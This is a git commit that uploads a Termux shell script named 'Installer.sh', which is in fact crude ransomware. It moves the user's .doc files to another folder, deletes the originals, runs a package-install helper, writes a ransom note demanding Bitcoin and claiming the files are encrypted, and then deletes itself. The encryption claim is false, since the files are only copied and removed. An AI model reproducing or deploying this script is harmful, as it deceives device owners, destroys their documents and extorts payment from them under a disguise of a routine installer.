b81f9cc1340df2749e485a20f977ce7945529533
Hex1629 <93824226+Hex1629@users.noreply.github.com>
2021-11-06 19:01:03 +0700

    Add files via upload

---
+++ Installer.sh
@@ -0,0 +1,26 @@
+cd /sdcard
+mkdir Encrypted
+tree | lolcat
+cd /$HOME
+cp -r *.doc /sdcard/Encrypted
+rm -r *.doc
+cd /sdcard
+echo "HUFCHf38384ifuJjtkRjgjfj28483">Encrypted.Encrypted
+mv /sdcard/*.Encrypted /$HOME
+clear
+cd /$HOME
+echo "pip lolcat
+pkg install python
+pkg install python2
+pkg install git
+pkg install python3 -y
+pkg update
+rm -r.Check.sh">Check.sh
+bash Check.sh
+echo "Oops! Your File Have Been Encrypted!!
+Payment :600.7
+Bitcoin:eUeuf7H2ur73jf&eUeuf7
+ID:
+Ransomware In Termux">Note.txt
+rm -r Installer.sh
+exit
